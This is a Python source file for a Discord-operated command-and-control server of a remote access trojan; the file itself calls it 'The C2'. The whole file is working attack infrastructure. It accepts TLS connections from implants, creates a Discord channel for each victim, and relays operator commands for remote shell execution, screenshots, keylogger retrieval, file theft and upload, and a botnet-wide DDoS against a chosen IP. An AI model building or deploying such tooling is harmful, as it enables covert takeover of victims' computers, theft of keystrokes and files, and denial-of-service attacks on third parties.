import socket
import threading
import discord
from discord.ext import commands
import asyncio
import secrets
import os
import filetype
import requests
import struct
import ssl
from dotenv import load_dotenv

HOST = "0.0.0.0"
PORT = 443

load_dotenv()
TOKEN = os.getenv("TOKEN")

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

clients: dict[str, tuple[socket.socket, threading.Lock]] = {}

intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents)

def send_message(conf: tuple[socket.socket, threading.Lock], data: bytes):
    with conf[1]:
        header = struct.pack(">I", len(data))
        conf[0].sendall(header + data)

def testip(ip_url: str, port: int):
    if port == 443:
        if not ip_url.startswith("https://"):
            ip_url = "https://" + ip_url.lstrip("http://")
    else:
        if not ip_url.startswith("http://"):
            ip_url = "http://" + ip_url.lstrip("https://")

    if port not in (80, 443):
        url_with_port = f"{ip_url}:{port}"
    else:
        url_with_port = ip_url

    try:
        requests.get(url_with_port, timeout=1)
        return True
    except:
        return False

async def handle_message(name: str, message: str):
    for guild in client.guilds:
        channel = discord.utils.get(guild.text_channels, name=name)
        if channel is None:
            channel = await guild.create_text_channel(name)
        filename = secrets.token_hex() + ".txt"
        if len(message) > 1900:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(message)
            try:
                await channel.send(file=discord.File(filename))
            except Exception as e:
                await channel.send(f"Error: The result is too large to be sent to Discord.")
            os.remove(filename)
        else:
            await channel.send(message)

async def handle_image(name: str, data: bytes):
    for guild in client.guilds:
        channel = discord.utils.get(guild.text_channels, name=name)
        if channel is None:
            channel = await guild.create_text_channel(name)
        kind = filetype.guess(data)
        if kind is None:
            ext = ".bin"
        else:
            ext = f".{kind.extension}"
        filename = secrets.token_hex() + ext
        with open(filename, "wb") as f:
            f.write(data)
        try:
            await channel.send(file=discord.File(filename))
        except Exception as e:
            await channel.send(f"Error: The result is too large to be sent to Discord.")
        os.remove(filename)

def recv_exact(conn: socket.socket, size: int) -> bytes:
    buf = bytearray()
    while len(buf) < size:
        chunk = conn.recv(size - len(buf))
        if not chunk:
            raise ConnectionError("Connection")
        buf.extend(chunk)
    return bytes(buf)

def client_handler(conn: socket.socket, name: str, loop: asyncio.AbstractEventLoop):
    try:
        with conn:
            asyncio.run_coroutine_threadsafe(
                handle_message(name, f"------- @everyone **{name}** is connected -------"),
                loop
            )

            while True:
                header = conn.recv(4)
                if not header:
                    break

                msg_len = struct.unpack(">I", header)[0]
                data = recv_exact(conn, msg_len)

                kind = filetype.guess(data)
                if kind and kind.mime.startswith("image/"):
                    asyncio.run_coroutine_threadsafe(handle_image(name, data), loop)
                else:
                    try:
                        msg = data.decode()
                        asyncio.run_coroutine_threadsafe(handle_message(name, msg), loop)
                    except UnicodeDecodeError:
                        asyncio.run_coroutine_threadsafe(
                            handle_message(name, f"Unrecognized data received from {name}"),loop)
    except Exception as e:
        asyncio.run_coroutine_threadsafe(handle_message(name, f"Error : {e}"), loop)
    finally:
        asyncio.run_coroutine_threadsafe(handle_message(name, f"**{name}** is disconnected."),loop)
        if name in clients:
            del clients[name]

def socket_server(loop):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"Server listening on {HOST}:{PORT}")

        while True:
            conn, addr = s.accept()
            try:
                tls_conn = context.wrap_socket(conn, server_side=True)
                header = tls_conn.recv(4)
                if not header:
                    tls_conn.close()
                    continue
                msg_len = struct.unpack(">I", header)[0]
                name = recv_exact(tls_conn, msg_len).decode()
                clients[name] = (tls_conn, threading.Lock())
                threading.Thread(target=client_handler, args=(tls_conn, name, loop), daemon=True).start()
            except Exception as e:
                print("Error :", e)

@client.event
async def on_ready():
    print(f"Connected as {client.user}")
    threading.Thread(target=socket_server, args=(client.loop,), daemon=True).start()
    for guild in client.guilds:
        c = discord.utils.get(guild.text_channels, name="general")
        if c is None:
            c = await guild.create_text_channel("general")
        await c.send("@everyone The C2 is connected")

@client.command()
async def ping(ctx: commands.Context):
    name = ctx.channel.name
    if name in clients:
        send_message(clients[name], b"ping")
    else:
        await ctx.send("No socket clients are associated to this channel.")

@client.command(name="restart", help="Restart the bot. Example: !restart")
async def restart(ctx: commands.Context):
    global clients
    
    await ctx.send("Restarting...")

    for client in clients.values():
        client[0].close()

    clients = {}

@client.command(name="shell", help="Executes a shell command on the client. Example: !shell <command>")
async def shell_cmd(ctx: commands.Context):
    name = ctx.channel.name
    if name in clients:
        send_message(clients[name], ctx.message.content[1:].encode())
    else:
        await ctx.send("[!] No clients are associated with this channel.")

@client.command(name="getscreenpic", help="Send a screenshot. Example: !getscreenpic")
async def getscreenpic(ctx : commands.Context):
    name = ctx.channel.name
    if name in clients:
        send_message(clients[name], ctx.message.content[1:].encode())
    else:
        await ctx.send("[!] No clients are associated with this channel.")

@client.command(name="volume", help="Allows changing the volume level between 0 and 100. Example: !volume 67")
async def volume(ctx : commands.Context):
    name = ctx.channel.name
    if name in clients:
        send_message(clients[name], ctx.message.content[1:].encode())
    else:
        await ctx.send("[!] No clients are associated with this channel.")

@client.command(name="message", help="Allows sending a message with a title and an icon. Choice of icons: [info, warning, error, question]\nUsage: !message Title::Message content::question")
async def message(ctx: commands.Context, *, content: str):
    name = ctx.channel.name
    if name not in clients:
        await ctx.send("[!] No clients are associated with this channel.")
    else:
        try:
            parts = content.split("::")
            if len(parts) != 3:
                await ctx.send("[!] Incorrect format. Usage: !message <Title>::<Message>::<Icon>")
                return
            send_message(clients[name], ctx.message.content[1:].encode())
        except Exception as e:
            await ctx.send(f"[!] An error occurred: {e}")

@client.command(name="keylogger", help="Allows retrieving all keystrokes recorded. Example: !keylogger")
async def keylogger(ctx: commands.Context):
    name = ctx.channel.name
    if name in clients:
        send_message(clients[name], ctx.message.content[1:].encode())
    else:
        await ctx.send("[!] No clients are associated with this channel.")

@client.command(name="download", help="Allows downloading a file or a folder. Example: !download C:/User/Downloads/<file.txt | folder>")
async def download(ctx: commands.Context):
    name = ctx.channel.name
    if name in clients:
        send_message(clients[name], ctx.message.content[1:].encode())
    else:
        await ctx.send("[!] No clients are associated with this channel.")

@client.command(name="upload", help="Allows uploading a file or zip provided as an attachment. Example: !upload C:/User/Downloads [attach file to message]")
async def upload(ctx: commands.Context, destination_path: str = None):
    name = ctx.channel.name

    if name not in clients:
        await ctx.send("[!] No clients are associated with this channel.")
        return

    try:
        if not destination_path:
            await ctx.send("[!] Please specify a valid path to save the file!")
            return

        if not ctx.message.attachments:
            await ctx.send("[!] No attachment found. Please attach a file!")
            return

        attachment = ctx.message.attachments[0]
        file_data = await attachment.read()
        filename = attachment.filename

        header = f"upload {destination_path}::{filename}::".encode()
        payload = header + file_data

        send_message(clients[name], payload)

    except Exception as e:
        await ctx.send(f"[!] An error occurred: {type(e).__name__} — {e}")

@client.command(name="ddos", help="Allows performing a DDOS on an IP address via http or https only. Example: !ddos <IP>::<PORT>::<TIME>")
async def ddos(ctx: commands.Context, ip: str = ""):
    if ctx.channel.name == "general":
        aaa = ip.split("::")
        if len(aaa) == 3:
            ip = aaa[0]
            port = int(aaa[1])
            temps = int(aaa[2])
        else:
            await ctx.send("[!] Incorrect format. Usage: !ddos <IP>::<PORT>::<TIME>")
            return
        if ip:
            if not testip(ip, port):
                await ctx.send("[!] Unable to connect to the IP.")
                return
            await ctx.send(f"[+] Starting DDOS attack on {ip} at port {port} for {temps} seconds.")
            for client in clients.values():
                send_message(client, ctx.message.content[1:].encode())
        else:
            await ctx.send("[!] Please specify a valid IP address.")
    else:
        await ctx.send("[!] Please execute this command in the #general channel.")

@client.command(name="broadcast", help="Allows sending a command to everyone. Usage: !broadcast getscreenpic")
async def broadcast(ctx: commands.Context, *, cmd: str = None):
    if ctx.channel.name == "general":
        if cmd is not None:
            s = 0
            for client in clients.values():
                try:
                    send_message(client, cmd.encode())
                    s += 1
                except:
                    pass
            await ctx.send(f"Command executed for {s} client(s)")
        else:
            await ctx.send("Please enter a command.")
    else:
        await ctx.send("[!] Please execute this command in the #general channel.")

@client.command(name="purge", help="Allows deleting all messages in a channel.")
async def purge(ctx: commands.Context):
    await ctx.send("In progress...")
    await ctx.channel.purge(limit=200)

@client.command(name="getaliveconnexions", help="Provides a list of existing connections. Example: !getaliveconnexions")
async def getaliveconnexions(ctx: commands.Context):
    res = ""
    for c in clients.keys():
        for guild in client.guilds:
            try:
                res += "https://discord.com/channels/" + str(guild.id) + "/" + str(discord.utils.get(guild.text_channels, name=c).id) + "\n"
            except:
                pass
    if not res:
        res = "No active connections."
    await ctx.send(res)

if __name__ == "__main__":
    try:
        client.run(TOKEN)
    except:
        client.clear()
        client.run(TOKEN)